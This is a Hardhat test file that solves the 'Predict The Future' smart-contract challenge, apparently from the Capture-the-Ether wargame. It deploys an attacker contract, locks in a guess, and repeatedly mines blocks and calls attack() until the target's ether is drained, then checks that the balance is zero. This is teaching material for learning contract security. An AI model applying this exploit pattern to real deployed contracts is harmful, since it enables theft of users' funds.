import { SignerWithAddress } from '@nomicfoundation/hardhat-ethers/signers';
import { expect } from 'chai';
import { ethers } from 'hardhat';
const { provider } = ethers;

import { Attacker, PredictTheFutureChallenge } from '../typechain-types';

describe('PredictTheFutureChallenge', () => {
  let target: PredictTheFutureChallenge;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = (await (
      await ethers.getContractFactory('PredictTheFutureChallenge', deployer)
    ).deploy({
      value: ethers.parseEther('1'),
    })) as unknown as PredictTheFutureChallenge;

    await target.waitForDeployment();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    const AttackerFactory = await ethers.getContractFactory('Attacker', attacker);
    const attackerContract = (await AttackerFactory.deploy(target.getAddress(), {
      value: ethers.parseEther('1'),
    })) as unknown as Attacker;

    await attackerContract.waitForDeployment();

    let tries = 0;

    await attackerContract.connect(attacker).lockInGuess();

    async function attack() {
      try {
        if (tries < 1000) {
          await provider.send('evm_mine');
          await provider.send('evm_mine');

          await attackerContract.connect(attacker).attack();
        }
      } catch (error) {
        tries++;
        await attack();
      }
    }

    await attack();

    expect(await provider.getBalance(target.getAddress())).to.equal(0);
    expect(await target.isComplete()).to.equal(true);
  });
});
